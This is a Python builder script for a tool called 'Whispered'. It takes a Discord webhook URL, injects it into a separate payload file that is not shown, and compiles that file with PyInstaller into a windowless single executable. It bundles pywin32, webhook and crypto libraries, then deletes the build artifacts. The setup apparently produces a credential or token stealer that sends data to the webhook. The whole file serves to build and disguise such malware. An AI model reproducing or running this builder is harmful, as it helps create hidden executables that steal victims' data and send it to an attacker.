import subprocess
import os
import shutil
from pystyle import *
from time import sleep

Whispered = """
 ▄█     █▄     ▄█    █▄     ▄█     ▄████████    ▄███████▄    ▄████████    ▄████████    ▄████████ ████████▄  
███     ███   ███    ███   ███    ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███   ▀███ 
███     ███   ███    ███   ███▌   ███    █▀    ███    ███   ███    █▀    ███    ███   ███    █▀  ███    ███ 
███     ███  ▄███▄▄▄▄███▄▄ ███▌   ███          ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███ 
███     ███ ▀▀███▀▀▀▀███▀  ███▌ ▀███████████ ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ 
███     ███   ███    ███   ███           ███   ███          ███    █▄  ▀███████████   ███    █▄  ███    ███ 
███ ▄█▄ ███   ███    ███   ███     ▄█    ███   ███          ███    ███   ███    ███   ███    ███ ███   ▄███ 
 ▀███▀███▀    ███    █▀    █▀    ▄████████▀   ▄████▀        ██████████   ███    ███   ██████████ ████████▀  
                                                                         ███    ███                         
"""

System.Size(140, 40)
System.Title("WHISPERED  by NinjaPanic")
Cursor.HideCursor()

System.Clear()
print("\n"*2)
print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(Whispered)))
print("\n"*3)
Write.Print("  [>] Whispered has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Whispered", Colors.red_to_purple, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.red_to_purple, interval=0.0125)
print("\n"*2)

current_directory = os.getcwd()
sleep(1.5)
webhook = Write.Input("  [>] Enter your Discord Webhook -> ", Colors.red_to_purple, interval=0.025)
sleep(1.5)
fname = Write.Input("\n  [>] Enter the file name -> ", Colors.red_to_purple, interval=0.025)
sleep(1.5)

with open("Whispered.py", "r") as file:
    f = file.read()

modified = f.replace("WebHook_URL", webhook)

with open(fname + ".py", "w") as file2:
    file2.write(modified)

output_folder = current_directory + "\\EXE" 
input_script = os.path.join(current_directory, f"{fname}.py")

subprocess.run([
    "pyinstaller",
    "--noconfirm",
    "--onefile",
    "--windowed",
    "--collect-submodules=requests",
    "--collect-submodules=discord-webhook",
    "--collect-submodules=pywin32",
    "--collect-submodules=ycryptodome",
    "--distpath", output_folder,
    input_script
], shell=True)

shutil.rmtree('build', ignore_errors=True)
spec_file = fname + ".spec"
if os.path.exists(spec_file):
    os.remove(spec_file)
if os.path.exists(input_script):
    os.remove(input_script)

System.Clear()
print("\n"*2)
print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(Whispered)))
print("\n"*3)
Write.Print("  [>] Whispered has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Whispered", Colors.red_to_purple)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.red_to_purple)
print("\n"*2)
Write.Print("  [>] File has successfully been created in /EXE", Colors.red_to_purple, interval=0.0125)
sleep(5)